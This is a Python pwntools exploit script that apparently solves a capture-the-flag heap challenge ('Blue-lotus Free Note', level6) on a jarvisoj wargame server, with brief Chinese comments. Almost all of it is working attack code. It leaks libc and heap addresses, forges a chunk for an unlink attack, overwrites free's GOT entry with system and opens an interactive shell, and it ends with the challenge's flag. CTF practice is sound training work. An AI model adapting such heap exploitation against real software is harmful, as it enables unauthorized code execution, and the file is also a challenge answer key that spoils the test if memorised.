#!/usr/bin/python3
# -*- coding: utf-8 -*-

"""
@author: starvii
如果依赖特定版本的libc，请使用patchelf对可执行文件修改

patchelf --set-interpreter /glibc/2.19/32/lib/ld-linux.so.2 ./level6_patched
patchelf --replace-needed libc.so.6 ./libc-2.19.so ./level6_patched
"""

import re
import sys
from os import path
from pwn import *
from pwnlib import gdb
from pwnlib.ui import pause

context(arch="i386", os="linux", log_level="debug")

elf_name = path.join(path.dirname(path.abspath(__file__)), "level6_patched")
_, host, port = re.split("\s+", "nc pwn2.jarvisoj.com 9885")

elf = ELF(elf_name)
libc = elf.libc
io = remote(host, port) if len(sys.argv) > 1 else process(elf_name)


def main():
    def show():
        io.sendlineafter(": ", "1")
        return io.recvuntil("== Blue-lotus Free Note ==", drop=True)

    def add(size, data):
        io.sendlineafter(": ", "2")
        io.sendlineafter(": ", str(size))
        io.sendafter(": ", data)

    def edit(idx, size, data):
        io.sendlineafter(": ", "3")
        io.sendlineafter(": ", str(idx))
        io.sendlineafter(": ", str(size))
        io.sendafter(": ", data)
        
    def delete(idx):
        io.sendlineafter(": ", "4")
        io.sendlineafter(": ", str(idx))

    N = 128
    add(N, "0" * N)
    add(N, "1" * N)
    add(N, "2" * N)
    add(N, "3" * N)

    delete(2)
    delete(0)

    edit(1, N + 0x8, "a" * (N + 0x8))  # 调整1的大小，使其刚好覆盖2的头部
    a = show().split(b"a" * (N + 0x8))[1][:8]
    libc_addr = u32(a[:4])
    log.success("libc_addr = 0x%x", libc_addr)
    libc.address = (libc_addr - 0x1ad000) & 0xfffff000
    log.success("libc_base = 0x%x", libc.address)
    log.success("system_addr = 0x%x", libc.sym["system"])
    bin_sh_addr = next(libc.search(b"/bin/sh"))
    log.success("bin_sh_addr = 0x%x", bin_sh_addr)

    heap_addr = u32(a[4:])
    log.success("heap_addr = 0x%x", heap_addr)
    heap_base = heap_addr & 0xfffff000
    log.success("heap_base = 0x%x", heap_base)

    fake_chunk_addr = heap_base + 0x24
    log.success("fake_chunk_addr = x/100wx 0x%x; ", fake_chunk_addr)

    # 在1中伪造chunk
    edit(1, N + 0x8, flat((
        0, N & 1,
        fake_chunk_addr - 4 * 3, fake_chunk_addr - 4 * 2,
        "b" * (N - 0x10),
        N, N + 8,
    )))

    delete(2)
    
    payload = flat((
        "@@@@",  # 0
        1, 0x100, heap_base,  # 1
        1, 0x08, bin_sh_addr,  # 2
        1, 0x04, elf.got["free"],  # 3
    )).ljust(N + 0x08, b"\0")

    edit(1, N + 0x08, payload)
    edit(3, 4, p32(libc.sym["system"]))
    delete(2)

    # gdb.attach(io)
    # pause()

    io.interactive()

if __name__ == "__main__":
    main()

# CTF{1ed0f9f23eb1df2c29149f44a597932c}
